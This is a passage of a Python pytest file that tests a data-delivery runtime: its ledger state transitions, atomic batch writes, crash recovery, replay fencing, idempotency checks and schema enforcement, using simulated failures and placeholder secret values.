    runtime.ledger = DeliveryLedger(path, clock=clock)
    runtime.claim_lease = timedelta(seconds=5)
    receipts = runtime.deliver_many(records)
    assert [receipt.status for receipt in receipts] == [DeliveryStatus.QUARANTINED] * 3
    original = runtime.ledger.get(records[0])
    assert original is not None
    assert original.state is DeliveryState.QUARANTINED
    assert original.current_write_batch_attempt_id is not None

    retry = runtime.ledger.rearm_for_retry(
        records[0],
        expected_state=DeliveryState.QUARANTINED,
        lease_for=runtime.claim_lease,
    )
    assert retry.state is DeliveryState.CLAIMED
    assert retry.batch_attempt_id == original.current_write_batch_attempt_id

    reopened = DeliveryLedger(path, clock=clock)
    still_safe = reopened.get(records[0])
    assert still_safe is not None
    assert still_safe.state is DeliveryState.CLAIMED
    assert still_safe.current_write_batch_attempt_id == original.current_write_batch_attempt_id
    assert reopened.claim(records[0], lease_for=runtime.claim_lease).disposition is (
        ClaimDisposition.IN_PROGRESS
    )

    clock.advance(timedelta(seconds=6))
    recovered = reopened.claim(records[0], lease_for=runtime.claim_lease)
    assert recovered.disposition is ClaimDisposition.RECOVERED
    assert recovered.state is DeliveryState.CLAIMED
    assert recovered.claim_token is not None
    assert recovered.batch_attempt_id == original.current_write_batch_attempt_id
    reopened.start_write(records[0], recovered.claim_token)
    final = reopened.get(records[0])
    assert final is not None
    assert final.state is DeliveryState.WRITE_STARTED
    assert final.current_write_batch_attempt_id is None


def test_delivery_many_falls_back_for_connector_without_atomic_batch(tmp_path: Path) -> None:
    destination = MemoryDestination()
    records, runtime = _batch_runtime(tmp_path, destination)

    receipts = runtime.deliver_many(records)

    assert [receipt.status for receipt in receipts] == [DeliveryStatus.DELIVERED] * 3
    assert destination.calls == 3


def test_scalar_fallback_interruption_preserves_completed_receipts(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    destination = MemoryDestination()
    records, runtime = _batch_runtime(tmp_path, destination)
    original_start = runtime.ledger.start_write
    calls = 0

    def fail_second_write_boundary(
        record,
        claim_token,
        *,
        idempotency_contract_id=None,
    ) -> None:
        nonlocal calls
        calls += 1
        if calls == 2:
            raise OSError("secret scalar ledger failure")
        original_start(
            record,
            claim_token,
            idempotency_contract_id=idempotency_contract_id,
        )

    monkeypatch.setattr(runtime.ledger, "start_write", fail_second_write_boundary)

    with pytest.raises(DeliveryBatchInterrupted) as raised:
        runtime.deliver_many(records)

    assert len(raised.value.completed_receipts) == 1
    assert raised.value.completed_receipts[0].record_id == records[0].record_id
    assert raised.value.completed_receipts[0].status is DeliveryStatus.DELIVERED
    assert runtime.ledger.get(records[0]).state is DeliveryState.COMMITTED
    assert runtime.ledger.get(records[1]).state is DeliveryState.CLAIMED
    assert destination.records == [{"token": "secret-0"}]
    assert "secret scalar ledger failure" not in str(raised.value)


def test_unknown_atomic_batch_outcome_quarantines_every_record(tmp_path: Path) -> None:
    destination = UnknownBatchOutcomeDestination()
    records, runtime = _batch_runtime(tmp_path, destination)

    receipts = runtime.deliver_many(records)

    assert [receipt.status for receipt in receipts] == [DeliveryStatus.QUARANTINED] * 3
    assert {receipt.reason_code for receipt in receipts} == {"atomic_batch_write_outcome_unknown"}
    assert destination.batch_calls == 1
    assert all(
        runtime.ledger.get(record).state is DeliveryState.BATCH_UNCERTAIN for record in records
    )
    assert len(runtime.spool.list_entries(limit=10)) == 3


def test_atomic_batch_capability_change_before_write_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    destination = AtomicMemoryDestination()
    records, runtime = _batch_runtime(tmp_path, destination)
    original_claim_many = runtime.ledger.claim_many

    def claim_then_downgrade(*args, **kwargs):
        claims = original_claim_many(*args, **kwargs)
        destination.capabilities = ConnectorCapabilities(write_records=True)
        return claims

    monkeypatch.setattr(runtime.ledger, "claim_many", claim_then_downgrade)

    receipts = runtime.deliver_many(records)

    assert [receipt.status for receipt in receipts] == [DeliveryStatus.QUARANTINED] * 3
    assert {receipt.reason_code for receipt in receipts} == {"atomic_batch_capability_changed"}
    assert all(receipt.retry_safe for receipt in receipts)
    assert destination.batch_calls == 0
    assert destination.calls == 0
    assert destination.records == []
    assert all(runtime.ledger.get(record).state is DeliveryState.QUARANTINED for record in records)
    assert len(runtime.spool.list_entries(limit=10)) == 3


def test_unknown_atomic_batch_uses_the_prewrite_capability_snapshot(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    destination = UnknownBatchOutcomeDestination()
    records, runtime = _batch_runtime(tmp_path, destination)
    original_write = destination.write_batch

    def write_then_upgrade(items):
        try:
            return original_write(items)
        finally:
            destination.capabilities = ConnectorCapabilities(
                write_records=True,
                transactional_write=True,
                supports_idempotency=True,
                idempotency_contract_id="tests.memory.post-write-batch-upgrade/v1",
                atomic_batch_write=AtomicBatchCapabilities(
                    max_records=100,
                    max_wire_bytes=1024 * 1024,
                    per_item_idempotency_across_batch_and_scalar=True,
                ),
            )

    monkeypatch.setattr(destination, "write_batch", write_then_upgrade)

    receipts = runtime.deliver_many(records)

    assert [receipt.status for receipt in receipts] == [DeliveryStatus.QUARANTINED] * 3
    assert {receipt.reason_code for receipt in receipts} == {"atomic_batch_write_outcome_unknown"}
    assert all(not receipt.retry_safe for receipt in receipts)
    assert destination.capabilities.supports_idempotency
    entries = tuple(runtime.ledger.get(record) for record in records)
    assert all(entry is not None for entry in entries)
    assert all(entry.idempotency_contract_id is None for entry in entries if entry is not None)
    with pytest.raises(PolicyViolation, match="idempotency"):
        runtime.replay(records[0].digest())
    assert destination.calls == 0
    assert destination.batch_calls == 1


def test_unknown_atomic_batch_receipts_use_the_prewrite_idempotency_snapshot(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    destination = IdempotentAtomicDestination(cross_path_idempotency=True)
    records, runtime = _batch_runtime(tmp_path, destination)
    original_write = destination.write_batch

    def write_then_downgrade(items):
        original_write(items)
        destination.capabilities = ConnectorCapabilities(write_records=True)
        raise RuntimeError("simulated lost acknowledgement during capability change")

    monkeypatch.setattr(destination, "write_batch", write_then_downgrade)

    receipts = runtime.deliver_many(records)

    assert {receipt.reason_code for receipt in receipts} == {"atomic_batch_write_outcome_unknown"}
    assert all(receipt.retry_safe for receipt in receipts)
    assert not destination.capabilities.supports_idempotency
    entries = tuple(runtime.ledger.get(record) for record in records)
    assert all(entry is not None for entry in entries)
    assert {entry.idempotency_contract_id for entry in entries if entry is not None} == {
        _BATCH_IDEMPOTENCY_CONTRACT_ID
    }


@pytest.mark.parametrize("acknowledgement", (True, 3.0))
def test_atomic_batch_rejects_a_non_plain_integer_acknowledgement(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    acknowledgement: object,
) -> None:
    destination = AtomicMemoryDestination()
    records, runtime = _batch_runtime(tmp_path, destination)

    def write_with_non_integer_ack(items) -> object:
        destination.batch_calls += 1
        destination.records.extend(dict(item.values) for item in items)
        return acknowledgement

    monkeypatch.setattr(destination, "write_batch", write_with_non_integer_ack)

    receipts = runtime.deliver_many(records)

    assert [receipt.status for receipt in receipts] == [DeliveryStatus.QUARANTINED] * 3
    assert {receipt.reason_code for receipt in receipts} == {"atomic_batch_write_outcome_unknown"}
    assert all(not receipt.retry_safe for receipt in receipts)
    assert all(
        runtime.ledger.get(record).state is DeliveryState.BATCH_UNCERTAIN for record in records
    )


@pytest.mark.parametrize(
    ("cross_path_idempotency", "ordinary_replay_allowed"),
    [(False, False), (True, True)],
)
def test_atomic_batch_crash_replay_requires_cross_path_idempotency(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    cross_path_idempotency: bool,
    ordinary_replay_allowed: bool,
) -> None:
    destination = IdempotentAtomicDestination(cross_path_idempotency=cross_path_idempotency)
    records, runtime = _batch_runtime(tmp_path, destination)
    ledger_path = runtime.ledger.path
    spool_path = runtime.spool.path

    def process_dies_before_ledger_outcome(_items: object) -> None:
        raise SystemExit("simulated process death after atomic commit")

    monkeypatch.setattr(
        runtime.ledger,
        "mark_committed_many",
        process_dies_before_ledger_outcome,
    )
    with pytest.raises(SystemExit, match="simulated process death after atomic commit"):
        runtime.deliver_many(records)

    assert destination.batch_calls == 1
    assert destination.records == [
        {"token": "secret-0"},
        {"token": "secret-1"},
        {"token": "secret-2"},
    ]
    crashed_entries = tuple(runtime.ledger.get(record) for record in records)
    assert all(entry is not None for entry in crashed_entries)
    assert all(
        entry.state is DeliveryState.BATCH_WRITE_STARTED for entry in crashed_entries if entry
    )
    assert {entry.idempotency_contract_id for entry in crashed_entries if entry is not None} == {
        _BATCH_IDEMPOTENCY_CONTRACT_ID if cross_path_idempotency else None
    }
    attempt_ids = {entry.current_write_batch_attempt_id for entry in crashed_entries if entry}
    assert len(attempt_ids) == 1
    batch_attempt_id = attempt_ids.pop()
    assert batch_attempt_id is not None
    runtime.spool.quarantine_many(records, "process_recovery")

    # Reopen both stores to prove that the write boundary and batch membership survive a
    # process restart, rather than relying on Python object state from the failed worker.
    runtime.ledger = DeliveryLedger(ledger_path)
    runtime.spool = SealedSpool(spool_path)
    assert {
        entry.record_digest for entry in runtime.ledger.get_batch_attempt(batch_attempt_id)
    } == {record.digest() for record in records}

    if not ordinary_replay_allowed:
        with pytest.raises(PolicyViolation, match="idempotency"):
            runtime.replay(records[0].digest())
        assert destination.calls == 0
        blocked_entry = runtime.ledger.get(records[0])
        assert blocked_entry is not None
        assert blocked_entry.current_write_batch_attempt_id == batch_attempt_id
        return

    batch_marker_at_scalar_write: list[str | None] = []
    state_at_scalar_write: list[DeliveryState] = []
    original_write_records = destination.write_records

    def observe_scalar_write_boundary(
        values,
        *,
        context: DeliveryContext | None = None,
    ) -> int:
        entry = runtime.ledger.get(records[0])
        assert entry is not None
        batch_marker_at_scalar_write.append(entry.current_write_batch_attempt_id)
        state_at_scalar_write.append(entry.state)
        return original_write_records(values, context=context)

    monkeypatch.setattr(destination, "write_records", observe_scalar_write_boundary)
    replay = runtime.replay(records[0].digest())

    assert replay.status is DeliveryStatus.DELIVERED
    assert destination.calls == 1
    assert destination.records == [
        {"token": "secret-0"},
        {"token": "secret-1"},
        {"token": "secret-2"},
    ]
    assert batch_marker_at_scalar_write == [batch_attempt_id]
    assert state_at_scalar_write == [DeliveryState.REPLAY_WRITE_STARTED]
    assert replay.batch_attempt_id == batch_attempt_id
    replayed_entry = runtime.ledger.get(records[0])
    assert replayed_entry is not None
    assert replayed_entry.state is DeliveryState.COMMITTED
    assert replayed_entry.current_write_batch_attempt_id == batch_attempt_id


def test_batch_replay_crash_keeps_fence_and_rechecks_changed_connector_capabilities(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    clock = MutableClock()
    destination = IdempotentAtomicDestination(cross_path_idempotency=True)
    records, runtime = _batch_runtime(tmp_path, destination)
    runtime.ledger = DeliveryLedger(tmp_path / "batch-replay-fence.db", clock=clock)
    runtime.claim_lease = timedelta(seconds=5)
    claims = runtime.ledger.claim_many(records, lease_for=runtime.claim_lease)
    transitions = tuple(
        (record, str(claim.claim_token)) for record, claim in zip(records, claims, strict=True)
    )
    batch_attempt_id = runtime.ledger.start_write_many(
        transitions,
        idempotency_contract_id=_BATCH_IDEMPOTENCY_CONTRACT_ID,
    )
    runtime.spool.quarantine_many(records, "process_recovery")

    def crash_after_rearm(
        current_runtime: DestinationRuntime,
        record: BlindTransportRecord,
        _claim_token: str,
        **_kwargs: object,
    ) -> DeliveryReceipt:
        assert current_runtime is runtime
        entry = runtime.ledger.get(record)
        assert entry is not None
        assert entry.state is DeliveryState.REPLAY_CLAIMED
        assert entry.current_write_batch_attempt_id == batch_attempt_id
        raise SystemExit("simulated replay death after rearm")

    with monkeypatch.context() as patch:
        patch.setattr(DestinationRuntime, "_deliver_claimed", crash_after_rearm)
        with pytest.raises(SystemExit, match="replay death after rearm"):
            runtime.replay(records[0].digest())

    replay_claim = runtime.ledger.get(records[0])
    assert replay_claim is not None
    assert replay_claim.state is DeliveryState.REPLAY_CLAIMED
    assert replay_claim.current_write_batch_attempt_id == batch_attempt_id
    with pytest.raises(IntegrityError, match="active delivery claim"):
        runtime.ledger.rearm_for_retry(
            records[0],
            expected_state=DeliveryState.REPLAY_CLAIMED,
            lease_for=runtime.claim_lease,
        )

    clock.advance(timedelta(seconds=6))
    expired = runtime.ledger.claim(records[0], lease_for=runtime.claim_lease)
    assert expired.disposition is ClaimDisposition.AMBIGUOUS
    assert expired.state is DeliveryState.REPLAY_CLAIMED
    assert expired.batch_attempt_id == batch_attempt_id

    destination.capabilities = ConnectorCapabilities(
        write_records=True,
        transactional_write=True,
        supports_idempotency=True,
        idempotency_contract_id=_BATCH_IDEMPOTENCY_CONTRACT_ID,
        atomic_batch_write=AtomicBatchCapabilities(
            max_records=100,
            max_wire_bytes=1024 * 1024,
            per_item_idempotency_across_batch_and_scalar=False,
        ),
    )
    receipt = runtime.deliver(records[0])
    assert receipt.status is DeliveryStatus.AMBIGUOUS
    assert receipt.reason_code == "previous_delivery_ambiguous"
    assert not receipt.retry_safe
    assert receipt.batch_attempt_id == batch_attempt_id
    batch_receipts = runtime.deliver_many(records[1:])
    assert [current.status for current in batch_receipts] == [DeliveryStatus.AMBIGUOUS] * 2
    assert all(not current.retry_safe for current in batch_receipts)
    assert {current.batch_attempt_id for current in batch_receipts} == {batch_attempt_id}
    with pytest.raises(PolicyViolation, match="idempotency"):
        runtime.replay(records[0].digest())
    assert destination.calls == 0
    assert destination.batch_calls == 0


def test_batch_replay_capability_change_after_rearm_stops_before_write(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    destination = IdempotentAtomicDestination(cross_path_idempotency=True)
    records, runtime = _batch_runtime(tmp_path, destination)
    claims = runtime.ledger.claim_many(records, lease_for=runtime.claim_lease)
    transitions = tuple(
        (record, str(claim.claim_token)) for record, claim in zip(records, claims, strict=True)
    )
    batch_attempt_id = runtime.ledger.start_write_many(
        transitions,
        idempotency_contract_id=_BATCH_IDEMPOTENCY_CONTRACT_ID,
    )
    runtime.spool.quarantine_many(records, "process_recovery")
    original_rearm = runtime.ledger.rearm_for_retry

    def rearm_then_downgrade(*args, **kwargs):
        rearmed = original_rearm(*args, **kwargs)
        destination.capabilities = ConnectorCapabilities(
            write_records=True,
            transactional_write=True,
            supports_idempotency=True,
            idempotency_contract_id=_BATCH_IDEMPOTENCY_CONTRACT_ID,
            atomic_batch_write=AtomicBatchCapabilities(
                max_records=100,
                max_wire_bytes=1024 * 1024,
                per_item_idempotency_across_batch_and_scalar=False,
            ),
        )
        return rearmed

    monkeypatch.setattr(runtime.ledger, "rearm_for_retry", rearm_then_downgrade)

    receipt = runtime.replay(records[0].digest())

    assert receipt.status is DeliveryStatus.QUARANTINED
    assert receipt.reason_code == "replay_capability_changed"
    assert not receipt.retry_safe
    assert receipt.batch_attempt_id == batch_attempt_id
    assert destination.calls == 0
    assert destination.batch_calls == 0
    entry = runtime.ledger.get(records[0])
    assert entry is not None
    assert entry.state is DeliveryState.REPLAY_QUARANTINED
    assert entry.current_write_batch_attempt_id == batch_attempt_id


def test_scalar_replay_crash_rechecks_connector_idempotency_after_restart(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    clock = MutableClock()
    destination = IdempotentFailOnceDestination()
    record, runtime = _runtime(tmp_path, destination)
    runtime.ledger = DeliveryLedger(tmp_path / "scalar-replay-fence.db", clock=clock)
    runtime.claim_lease = timedelta(seconds=5)
    first = runtime.deliver(record)
    assert first.reason_code == "write_outcome_unknown"
    assert runtime.ledger.get(record).state is DeliveryState.UNCERTAIN

    def crash_after_rearm(
        current_runtime: DestinationRuntime,
        current: BlindTransportRecord,
        _claim_token: str,
        **_kwargs: object,
    ) -> DeliveryReceipt:
        assert current_runtime is runtime
        entry = runtime.ledger.get(current)
        assert entry is not None
        assert entry.state is DeliveryState.REPLAY_CLAIMED
        assert entry.current_write_batch_attempt_id is None
        raise SystemExit("simulated replay death after rearm")

    with monkeypatch.context() as patch:
        patch.setattr(DestinationRuntime, "_deliver_claimed", crash_after_rearm)
        with pytest.raises(SystemExit, match="replay death after rearm"):
            runtime.replay(record.digest())

    runtime.connector = MemoryDestination()
    clock.advance(timedelta(seconds=6))
    claim = runtime.ledger.claim(record, lease_for=runtime.claim_lease)
    assert claim.disposition is ClaimDisposition.AMBIGUOUS
    assert claim.state is DeliveryState.REPLAY_CLAIMED
    receipt = runtime.deliver(record)
    assert receipt.status is DeliveryStatus.AMBIGUOUS
    assert receipt.reason_code == "previous_delivery_ambiguous"
    with pytest.raises(PolicyViolation, match="idempotency"):
        runtime.replay(record.digest())
    assert runtime.connector.calls == 0
    assert destination.calls == 1


@pytest.mark.parametrize("failure_stage", ("prewrite", "known_rollback", "unknown"))
def test_guarded_replay_failures_remain_fenced_for_the_next_attempt(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    failure_stage: str,
) -> None:
    destination = IdempotentFailOnceDestination()
    record, runtime = _runtime(tmp_path, destination)
    first = runtime.deliver(record)
    assert first.reason_code == "write_outcome_unknown"

    if failure_stage == "prewrite":
        runtime._plan_digest = "0" * 64
    elif failure_stage == "known_rollback":

        def reject_write(_records: object, *, context: object = None) -> int:
            raise ConnectorWriteError(
                "simulated destination rollback",
                outcome=WriteOutcome.NOT_COMMITTED,
            )

        monkeypatch.setattr(destination, "write_records", reject_write)
    else:
        destination.fail_once = True

    replay = runtime.replay(record.digest())

    assert replay.status is DeliveryStatus.QUARANTINED
    expected_reason = {
        "prewrite": "destination_contract_failed",
        "known_rollback": "write_not_committed",
        "unknown": "write_outcome_unknown",
    }[failure_stage]
    assert replay.reason_code == expected_reason
    entry = runtime.ledger.get(record)
    assert entry is not None
    expected_state = (
        DeliveryState.REPLAY_UNCERTAIN
        if failure_stage == "unknown"
        else DeliveryState.REPLAY_QUARANTINED
    )
    assert entry.state is expected_state
    assert runtime.spool.get(record.digest()) is not None

    runtime.connector = MemoryDestination()
    with pytest.raises(PolicyViolation, match="idempotency"):
        runtime.replay(record.digest())
    assert runtime.connector.calls == 0


def test_delivery_many_count_limit_stops_generator_before_side_effects(
    tmp_path: Path,
) -> None:
    destination = AtomicMemoryDestination()
    records, runtime = _batch_runtime(tmp_path, destination, count=1)
    consumed = 0

    def oversized_records() -> Iterator[BlindTransportRecord]:
        nonlocal consumed
        for _ in range(20_000):
            consumed += 1
            yield records[0]

    with pytest.raises(ValueError, match="record count limit"):
        runtime.deliver_many(oversized_records())  # type: ignore[arg-type]

    assert consumed == 10_001
    assert destination.batch_calls == 0
    assert destination.calls == 0
    assert destination.records == []
    assert runtime.ledger.get(records[0]) is None
    assert runtime.spool.list_entries(limit=1) == ()


def test_rejected_atomic_batch_is_known_safe_to_retry(tmp_path: Path) -> None:
    destination = RejectedBatchDestination()
    records, runtime = _batch_runtime(tmp_path, destination)

    receipts = runtime.deliver_many(records)

    assert [receipt.status for receipt in receipts] == [DeliveryStatus.QUARANTINED] * 3
    assert {receipt.reason_code for receipt in receipts} == {"write_not_committed"}
    assert all(receipt.retry_safe for receipt in receipts)
    assert all(runtime.ledger.get(record).state is DeliveryState.QUARANTINED for record in records)
    assert destination.records == []


def test_atomic_batch_ledger_commit_failure_never_blindly_retries(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    destination = AtomicMemoryDestination()
    records, runtime = _batch_runtime(tmp_path, destination)

    def fail_commit(_items: object) -> None:
        raise OSError("simulated ledger commit failure")

    monkeypatch.setattr(runtime.ledger, "mark_committed_many", fail_commit)
    receipts = runtime.deliver_many(records)

    assert [receipt.status for receipt in receipts] == [DeliveryStatus.AMBIGUOUS] * 3
    assert {receipt.reason_code for receipt in receipts} == {"delivery_outcome_record_failed"}
    assert destination.batch_calls == 1
    assert all(
        runtime.ledger.get(record).state is DeliveryState.BATCH_WRITE_STARTED for record in records
    )


def test_atomic_batch_spool_cleanup_failure_is_not_a_retry_signal(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    destination = AtomicMemoryDestination()
    records, runtime = _batch_runtime(tmp_path, destination)
    runtime.events = EventStream(tmp_path / "cleanup-events.jsonl")

    def fail_cleanup(_digests: object) -> int:
        raise OSError("simulated spool cleanup failure")

    monkeypatch.setattr(runtime.spool, "remove_many", fail_cleanup)
    first = runtime.deliver_many(records)
    second = runtime.deliver_many(records)

    assert [receipt.status for receipt in first] == [DeliveryStatus.DELIVERED] * 3
    assert {receipt.reason_code for receipt in first} == {"sealed_spool_cleanup_failed"}
    assert [receipt.status for receipt in second] == [DeliveryStatus.DUPLICATE] * 3
    assert destination.batch_calls == 1
    summary = runtime.events.summary()
    assert summary.event_contract_valid
    assert summary.reasons == {"sealed_spool_cleanup_failed": 4}


def test_batch_ledger_transition_rolls_back_every_sibling(tmp_path: Path) -> None:
    destination = AtomicMemoryDestination()
    records, runtime = _batch_runtime(tmp_path, destination)
    claims = runtime.ledger.claim_many(records)
    assert all(claim.claim_token is not None for claim in claims)
    tokens = tuple(str(claim.claim_token) for claim in claims)
    runtime.ledger.start_write(records[1], tokens[1])

    with pytest.raises(IntegrityError, match="batch state transition"):
        runtime.ledger.start_write_many(tuple(zip(records, tokens, strict=True)))

    assert runtime.ledger.get(records[0]).state is DeliveryState.CLAIMED
    assert runtime.ledger.get(records[1]).state is DeliveryState.WRITE_STARTED
    assert runtime.ledger.get(records[2]).state is DeliveryState.CLAIMED


def _typed_runtime(
    tmp_path: Path,
    value: object,
    target_type: DataType,
    *,
    nullable: bool = True,
):
    source = SchemaDescriptor("source", (FieldDescriptor("value", "Value"),))
    target = SchemaDescriptor(
        "target",
        (FieldDescriptor("value", "Value", target_type, nullable=nullable),),
    )
    plan = MappingPlan(
        "typed-plan",
        source.id,
        target.id,
        source.fingerprint(),
        target.fingerprint(),
        (MappingRule("value", "value"),),
    )
    keys = RecipientKeyPair.generate()
    signer = SigningKeyPair.generate()
    trust = SourceTrustStore([TrustedSourceKey(signer.public_bytes(), "tenant", "source")])
    record = BlindSourceAgent(
        tenant="tenant",
        source_connector_id="source",
        destination_connector_id="db",
        source_schema=source,
        target_schema=target,
        plan=plan,
        destination_public_key=keys.public_bytes(),
        signing_key=signer,
        allow_unauthenticated_recipient_key=True,
    ).prepare_record({"value": value}, record_id="r1", transfer_id="t1")
    destination = MemoryDestination()
    agent = BlindDestinationAgent(
        keys.private_key,
        expected_tenant="tenant",
        expected_connector_id="db",
        source_trust_store=trust,
    )
    runtime = DestinationRuntime(
        connector_id="db",
        agent=agent,
        connector=destination,
        ledger=DeliveryLedger(tmp_path / "typed-ledger.db"),
        spool=SealedSpool(tmp_path / "typed-spool.db"),
        plan=plan,
        target_schema=target,
    )
    return record, runtime, destination


def test_runtime_delivers_once_and_deduplicates(tmp_path):
    destination = MemoryDestination()
    record, runtime = _runtime(tmp_path, destination)

    first = runtime.deliver(record)
    second = runtime.deliver(record)

    assert first.status is DeliveryStatus.DELIVERED
    assert second.status is DeliveryStatus.DUPLICATE
    assert destination.calls == 1
    assert destination.records == [{"token": "s3cr3t"}]


def test_json_post_publish_cleanup_failure_cannot_trigger_duplicate_retry(
    tmp_path, monkeypatch: pytest.MonkeyPatch
) -> None:
    target = tmp_path / "destination.json"
    record, runtime = _runtime(tmp_path, JsonFileConnector(target))
    real_unlink = filesystem.os.unlink

    def fail_temporary_cleanup(path) -> None:
        if Path(path).name.startswith(f".{target.name}."):
            raise PermissionError("simulated post-publish cleanup failure")
        real_unlink(path)

    monkeypatch.setattr(filesystem.os, "unlink", fail_temporary_cleanup)
    first = runtime.deliver(record)
    monkeypatch.setattr(filesystem.os, "unlink", real_unlink)
    second = runtime.deliver(record)

    assert first.status is DeliveryStatus.DELIVERED
    assert second.status is DeliveryStatus.DUPLICATE
    assert json.loads(target.read_text(encoding="utf-8")) == [{"token": "s3cr3t"}]
    for leftover in tmp_path.glob(f".{target.name}.*"):
        leftover.unlink()


def test_runtime_pins_unrestricted_agent_to_exact_plan(tmp_path) -> None:
    record, keys, plan, trust = _transport()
    target = SchemaDescriptor(
        "target",
        (FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),),
    )
    agent = BlindDestinationAgent(
        keys.private_key,
        expected_tenant="tenant",
        allowed_plan_digests=None,
        source_trust_store=trust,
    )

    DestinationRuntime(
        connector_id="db",
        agent=agent,
        connector=MemoryDestination(),
        ledger=DeliveryLedger(tmp_path / "ledger.db"),
        spool=SealedSpool(tmp_path / "spool.db"),
        plan=plan,
        target_schema=target,
    )

    assert agent.allowed_plan_digests == frozenset({record.plan_digest})
    assert agent.expected_connector_id == "db"


def test_runtime_narrows_broader_plan_allowlist_but_preserves_denial(tmp_path) -> None:
    _, keys, plan, trust = _transport()
    target = SchemaDescriptor(
        "target",
        (FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),),
    )
    broader_agent = BlindDestinationAgent(
        keys.private_key,
        allowed_plan_digests=frozenset({plan.digest(), "another-plan"}),
        source_trust_store=trust,
    )

    DestinationRuntime(
        connector_id="db",
        agent=broader_agent,
        connector=MemoryDestination(),
        ledger=DeliveryLedger(tmp_path / "broader-ledger.db"),
        spool=SealedSpool(tmp_path / "broader-spool.db"),
        plan=plan,
        target_schema=target,
    )
    assert broader_agent.allowed_plan_digests == frozenset({plan.digest()})

    denying_agent = BlindDestinationAgent(
        keys.private_key,
        allowed_plan_digests=frozenset(),
        source_trust_store=trust,
    )
    with pytest.raises(ValueError, match="not authorized"):
        DestinationRuntime(
            connector_id="db",
            agent=denying_agent,
            connector=MemoryDestination(),
            ledger=DeliveryLedger(tmp_path / "denied-ledger.db"),
            spool=SealedSpool(tmp_path / "denied-spool.db"),
            plan=plan,
            target_schema=target,
        )


def test_runtime_rejects_plan_target_contract_drift(tmp_path) -> None:
    _, keys, plan, trust = _transport()
    drifted_target = SchemaDescriptor(
        "target",
        (
            FieldDescriptor(
                "token",
                "API Token",
                DataType.STRING,
                sensitivity=Sensitivity.SECRET,
            ),
        ),
    )

    with pytest.raises(ValueError, match="fingerprint"):
        DestinationRuntime(
            connector_id="db",
            agent=BlindDestinationAgent(keys.private_key, source_trust_store=trust),
            connector=MemoryDestination(),
            ledger=DeliveryLedger(tmp_path / "ledger.db"),
            spool=SealedSpool(tmp_path / "spool.db"),
            plan=plan,
            target_schema=drifted_target,
        )


def test_runtime_rejects_plan_target_schema_id_mismatch(tmp_path) -> None:
    _, keys, plan, trust = _transport()
    wrong_target = SchemaDescriptor(
        "different-target",
        (FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),),
    )

    with pytest.raises(ValueError, match="ids differ"):
        DestinationRuntime(
            connector_id="db",
            agent=BlindDestinationAgent(keys.private_key, source_trust_store=trust),
            connector=MemoryDestination(),
            ledger=DeliveryLedger(tmp_path / "ledger.db"),
            spool=SealedSpool(tmp_path / "spool.db"),
            plan=plan,
            target_schema=wrong_target,
        )


def test_runtime_rejects_unmapped_required_target_before_delivery(tmp_path) -> None:
    _, keys, plan, trust = _transport()
    target = SchemaDescriptor(
        "target",
        (
            FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),
            FieldDescriptor("required", "Required", nullable=False),
        ),
    )
    rebound_plan = MappingPlan(
        plan.id,
        plan.source_schema_id,
        target.id,
        plan.source_fingerprint,
        target.fingerprint(),
        plan.rules,
    )

    with pytest.raises(ValueError, match="required target"):
        DestinationRuntime(
            connector_id="db",
            agent=BlindDestinationAgent(keys.private_key, source_trust_store=trust),
            connector=MemoryDestination(),
            ledger=DeliveryLedger(tmp_path / "ledger.db"),
            spool=SealedSpool(tmp_path / "spool.db"),
            plan=rebound_plan,
            target_schema=target,
        )


def test_runtime_allows_explicit_destination_generated_target(tmp_path) -> None:
    _, keys, plan, trust = _transport()
    target = SchemaDescriptor(
        "target",
        (
            FieldDescriptor("token", "API Token", sensitivity=Sensitivity.SECRET),
            FieldDescriptor(
                "generated_id",
                "Generated ID",
                nullable=False,
                destination_generated=True,
            ),
        ),
    )
    rebound_plan = MappingPlan(
        plan.id,
        plan.source_schema_id,
        target.id,
        plan.source_fingerprint,
        target.fingerprint(),
        plan.rules,
    )

    DestinationRuntime(
        connector_id="db",
        agent=BlindDestinationAgent(keys.private_key, source_trust_store=trust),
        connector=MemoryDestination(),
        ledger=DeliveryLedger(tmp_path / "ledger.db"),
        spool=SealedSpool(tmp_path / "spool.db"),
        plan=rebound_plan,
        target_schema=target,
    )


@pytest.mark.parametrize(
    ("target_type", "value", "expected_status"),
    (
        (DataType.STRING, 7, DeliveryStatus.QUARANTINED),
        (DataType.INTEGER, Decimal("7"), DeliveryStatus.QUARANTINED),
        (DataType.DECIMAL, 7, DeliveryStatus.DELIVERED),
        (DataType.UNKNOWN, {"anything": [1, 2]}, DeliveryStatus.DELIVERED),
    ),
)
def test_runtime_enforces_conservative_target_types(
    tmp_path,
    target_type,
    value,
    expected_status,
) -> None:
    record, runtime, destination = _typed_runtime(tmp_path, value, target_type)

    receipt = runtime.deliver(record)

    assert receipt.status is expected_status
    if expected_status is DeliveryStatus.QUARANTINED:
        assert receipt.reason_code == "destination_contract_failed"
        assert destination.calls == 0
    else:
        assert destination.calls == 1


@pytest.mark.parametrize("value", (Decimal("NaN"), Decimal("Infinity"), float("inf")))
def test_runtime_unknown_type_still_rejects_non_finite_numbers(value: object) -> None:
    assert not DestinationRuntime._value_satisfies_type(value, DataType.UNKNOWN)


def test_runtime_rejects_authenticated_non_finite_payload_before_write(tmp_path) -> None:
    record, runtime, destination = _typed_runtime(
        tmp_path,
        "placeholder",
        DataType.UNKNOWN,
    )
    signer = SigningKeyPair.generate()
    assert runtime.agent.source_trust_store is not None
    runtime.agent.source_trust_store.add(
        TrustedSourceKey(signer.public_bytes(), record.tenant, record.source_connector)
